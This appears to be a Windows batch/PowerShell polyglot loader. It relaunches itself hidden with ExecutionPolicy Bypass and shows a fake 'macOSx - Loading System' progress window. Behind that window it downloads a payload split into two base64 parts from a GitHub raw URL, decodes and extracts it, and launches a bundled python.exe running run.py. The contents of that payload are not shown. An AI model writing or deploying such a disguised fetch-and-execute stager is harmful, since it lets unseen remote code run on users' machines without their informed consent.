<# :
@echo off
setlocal
cd /d "%~dp0"
start "" /B powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (Get-Content -Raw '%~f0')"
exit
#>
$ErrorActionPreference = 'Stop'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "macOSx - Loading System"
$form.Size = New-Object System.Drawing.Size(400, 150)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = 'FixedDialog'
$form.ControlBox = $false
$form.TopMost = $true
$form.ShowInTaskbar = $true
$form.BackColor = [System.Drawing.Color]::White

$lbl = New-Object System.Windows.Forms.Label
$lbl.Location = New-Object System.Drawing.Point(20, 20)
$lbl.Size = New-Object System.Drawing.Size(340, 45)
$lbl.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$lbl.Text = "Initializing..."
$form.Controls.Add($lbl)

$pb = New-Object System.Windows.Forms.ProgressBar
$pb.Location = New-Object System.Drawing.Point(20, 70)
$pb.Size = New-Object System.Drawing.Size(340, 20)
$pb.Style = 'Marquee'
$pb.MarqueeAnimationSpeed = 30
$form.Controls.Add($pb)

$form.Show()
$form.Refresh()

$sync = [hashtable]::Synchronized(@{})
$sync.Status = "Loading content part 1...`nPlease wait."
$sync.Done = $false
$sync.Error = $null
$sync.url1 = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main/macOSx.zip.b64.part1'
$sync.url2 = 'https://raw.githubusercontent.com/bangwonie/lnk/refs/heads/main/macOSx.zip.b64.part2'
$sync.base = (Get-Location).Path
$sync.destFolder = Join-Path $sync.base 'macOSx'

$runspace = [runspacefactory]::CreateRunspace()
$runspace.Open()

$ps = [PowerShell]::Create().AddScript({
    param($sync)
    $ErrorActionPreference = 'Stop'
    try {
        try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 } catch {}

        $s1 = (Invoke-WebRequest -Uri $sync.url1 -UseBasicParsing).Content.Trim()
        
        $sync.Status = "Loading content part 2...`nPlease wait."
        $s2 = (Invoke-WebRequest -Uri $sync.url2 -UseBasicParsing).Content.Trim()

        $b64 = $s1 + $s2
        $sync.Status = "Decrypting content..."
        $bytes = [Convert]::FromBase64String($b64)

        $zipPath = Join-Path $env:TEMP ('macOSx-{0}.zip' -f [Guid]::NewGuid().ToString('N'))
        [System.IO.File]::WriteAllBytes($zipPath, $bytes)

        if (Test-Path -LiteralPath $sync.destFolder) {
            $sync.Status = "Clearing old data..."
            Remove-Item -LiteralPath $sync.destFolder -Recurse -Force
        }

        $sync.Status = "Updating...`nAlmost done."
        Expand-Archive -LiteralPath $zipPath -DestinationPath $sync.base -Force
        Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue

        $sync.Status = "Completed!`nStarting application..."
    } catch {
        $sync.Error = $_.Exception.Message
    } finally {
        $sync.Done = $true
    }
}).AddArgument($sync)

$ps.Runspace = $runspace
$handle = $ps.BeginInvoke()

while (-not $sync.Done) {
    if ($lbl.Text -ne $sync.Status) { $lbl.Text = $sync.Status }
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 50
}

if ($sync.Error) {
    $pb.Style = 'Blocks'
    $pb.Value = 100
    [System.Windows.Forms.MessageBox]::Show($sync.Error, "Critical Error")
    $lbl.Text = "Hệ thống gặp sự cố!"
    $form.Refresh()
    Start-Sleep -Seconds 5
} else {
    $lbl.Text = $sync.Status
    $pb.Style = 'Blocks'
    $pb.Value = 100
    $form.Refresh()
    Start-Sleep -Seconds 1
    
    $pyScript = Join-Path $sync.base 'macOSx\run.py'
    $pyExe = Join-Path $sync.destFolder 'python.exe'
    if ((Test-Path $pyScript) -and (Test-Path $pyExe)) {
        Start-Process -FilePath $pyExe -ArgumentList "`"run.py`"" -WorkingDirectory $sync.destFolder -WindowStyle Normal
    }
}

$form.Close()
$ps.Dispose()
$runspace.Close()
$runspace.Dispose()
